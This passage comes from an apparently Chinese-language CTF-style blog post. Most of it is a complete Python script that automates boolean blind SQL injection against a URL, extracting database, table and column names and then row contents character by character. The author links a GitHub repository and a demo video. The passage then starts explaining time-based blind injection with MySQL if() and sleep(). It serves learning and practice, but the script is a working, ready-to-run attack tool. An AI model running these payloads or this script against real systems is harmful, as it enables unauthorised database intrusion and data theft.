(Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database_length</span>():<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and length(database()) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        url = base_url + quote(<span class="hljs-built_in">id</span>) <span class="hljs-comment">#很重要，因为id中有许多特殊字符，比如#，需要进行url编码</span><br>        response = requests.get(url, headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;database length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;database length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>(<span class="hljs-params">database_length</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    database = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, database_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and ascii(substr(database(), &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                database += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知数据库名&quot;</span>, database)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and ascii(substr(database(), &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名为&quot;</span>, database)<br>    <span class="hljs-keyword">return</span> database<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_table_num</span>(<span class="hljs-params">database</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    num = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select count(table_name) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27;) = &quot;</span> + <span class="hljs-built_in">str</span>(num)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库中有&quot;</span>, num, <span class="hljs-string">&quot;个表&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> num<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_table_length</span>(<span class="hljs-params">index, database</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select length(table_name) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;, 1) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表名的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_table</span>(<span class="hljs-params">index, table_length, database</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    table = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, table_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and (select ascii(substr(table_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                table += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知数据库名&quot;</span>, table)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and (select ascii(substr(table_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表名为&quot;</span>, table)<br>    <span class="hljs-keyword">return</span> table<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_column_num</span>(<span class="hljs-params">table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    num = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select count(column_name) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27;) = &quot;</span> + <span class="hljs-built_in">str</span>(num)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;中有&quot;</span>, num, <span class="hljs-string">&quot;个字段&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> num<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_column_length</span>(<span class="hljs-params">index, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select length(column_name) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;, 1) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;个字段的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_column</span>(<span class="hljs-params">index, column_length, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    column = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, column_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and (select ascii(substr(column_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                column += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知字段为&quot;</span>, column)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and (select ascii(substr(column_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;个字段名为&quot;</span>, column)<br>    <span class="hljs-keyword">return</span> column<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_num</span>(<span class="hljs-params">column, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    num = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select count(&quot;</span> + column + <span class="hljs-string">&quot;) from &quot;</span> + table + <span class="hljs-string">&quot;) = &quot;</span> + <span class="hljs-built_in">str</span>(num)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;中有&quot;</span>, num, <span class="hljs-string">&quot;行数据&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> num<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_length</span>(<span class="hljs-params">index, column, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select length(&quot;</span> + column + <span class="hljs-string">&quot;) from &quot;</span> + table + <span class="hljs-string">&quot; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;, 1) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;行数据的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>(<span class="hljs-params">index, flag_length, column, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, flag_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and (select ascii(substr(&quot;</span> + column + <span class="hljs-string">&quot;, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from &quot;</span> + table + <span class="hljs-string">&quot; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知flag为&quot;</span>, flag)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and (select ascii(substr(&quot;</span> + column + <span class="hljs-string">&quot;, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from &quot;</span> + table + <span class="hljs-string">&quot; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;行数据为&quot;</span>, flag)<br>    <span class="hljs-keyword">return</span> flag<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据库名长度&quot;</span>)<br>    database_length = get_database_length()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据库名&quot;</span>)<br>    database = get_database(database_length)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表的个数&quot;</span>)<br>    table_num = get_table_num(database)<br>    tables = []<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, table_num):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个数据表的名称的长度&quot;</span>)<br>        table_length = get_table_length(i, database)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个数据表的名称&quot;</span>)<br>        table = get_table(i, table_length, database)<br>        tables.append(table)<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>): <span class="hljs-comment">#在这个循环中可以进入所有的数据表一探究竟</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;现在得到了以下数据表&quot;</span>, tables)<br>        table = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请在这些数据表中选择一个目标: &quot;</span>)<br>        <span class="hljs-keyword">while</span>( table <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> tables ):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;你输入有误&quot;</span>)<br>            table = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请重新选择一个目标&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;选择成功，开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的字段数量&quot;</span>)<br>        column_num = get_column_num(table)<br>        columns = []<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, column_num):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个字段名称的长度&quot;</span>)<br>            column_length = get_column_length(i, table)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个字段的名称&quot;</span>)<br>            column = get_column(i, column_length, table)<br>            columns.append(column)<br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>): <span class="hljs-comment">#在这个循环中可以获取当前选择数据表的所有字段记录</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;现在得到了数据表&quot;</span>, table, <span class="hljs-string">&quot;中的以下字段&quot;</span>, columns)<br>            column = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请在这些字段中选择一个目标: &quot;</span>)<br>            <span class="hljs-keyword">while</span>( column <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> columns ):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;你输入有误&quot;</span>)<br>                column = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请重新选择一个目标&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;选择成功，开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的记录数量&quot;</span>)<br>            flag_num = get_flag_num(column, table)<br>            flags = []<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, flag_num):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的&quot;</span>, column, <span class="hljs-string">&quot;字段的第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;行记录的长度&quot;</span>)<br>                flag_length = get_flag_length(i, column, table)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的&quot;</span>, column, <span class="hljs-string">&quot;字段的第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;行记录的内容&quot;</span>)<br>                flag = get_flag(i, flag_length, column, table)<br>                flags.append(flag)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;现在得到了数据表&quot;</span>, table, <span class="hljs-string">&quot;中&quot;</span>, column, <span class="hljs-string">&quot;字段中的以下记录&quot;</span>, flags)<br>            quit = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;继续切换字段吗？(y/n)&quot;</span>)<br>            <span class="hljs-keyword">if</span> (quit == <span class="hljs-string">&#x27;n&#x27;</span> <span class="hljs-keyword">or</span> quit == <span class="hljs-string">&#x27;N&#x27;</span>):<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br>        quit = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;继续切换数据表名吗？(y/n)&quot;</span>)<br>        <span class="hljs-keyword">if</span> (quit == <span class="hljs-string">&#x27;n&#x27;</span> <span class="hljs-keyword">or</span> quit == <span class="hljs-string">&#x27;N&#x27;</span>):<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bye~&quot;</span>)<br><br></code></pre></td></tr></table></figure>
<p>先给出github地址。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/wuuconix/SQL-Blind-Injection-Auto">wuuconix/SQL-Blind-Injection-Auto: 自己写的SQL盲注自动化脚本 (github.com)</a></p>
<p>最后在给出演示视频。</p>
<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
<iframe src="//player.bilibili.com/player.html?aid=462667794&bvid=BV1fL411b7b8&cid=397907709&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;" ></iframe></div>
<h3 id="时间盲注"><a class="markdownIt-Anchor" href="#时间盲注"></a> 时间盲注</h3>
<p>时间盲注和上一篇布尔盲注一样都是盲注，都需要借助<code>length</code>,<code>ascii</code>,<code>substr</code>这些神奇的函数来猜测各项信息。它们的差别是猜测成功的依据。</p>
<p>布尔盲注的话如果查询有结果，一般会有一个<code>success_flag</code>,比如在上一题里就会返回<code>query successfully</code>。我的脚本也就是request返回值里有没有这个文本来判断是否查询成功的。</p>
<p>但是时间盲注不一样，它不光不给你查询的内容的回显，不给你报错信息，甚至连布尔盲注里的<code>success_flag</code>也不给你。也就是什么情况呢？你在那里查询，它什么信息都不给你，也就是所谓的<code>无回显</code>。我以前认为无回显是根本不可能做出来的。但是时间盲注让我打开眼界。</p>
<p>时间盲注相当于自行创造出了一个<code>success_flag</code>，将查询成功的情况与查询失败的情况做了区分。以此区别作为依据，我们便可以进行猜测，盲注。</p>
<p>这个区别是这样产生的。主要利用了mysql中的<code>if</code>函数和<code>sleep</code>函数。我们看下面一条语句。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>, <span class="hljs-number">1</span>, sleep(<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure>
<p>if函数的第一个参数是一条判断语句，<code>1=1</code>为真，所以if函数会返回第二个参数即<code>1</code>。即</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>这很显然会正常返回结果。</p>
<p><img src="https://upyun.wuuconix.link/image-20210828204333158.png" srcset="/img/loading.gif" lazyload alt="1 and 1" /></p>
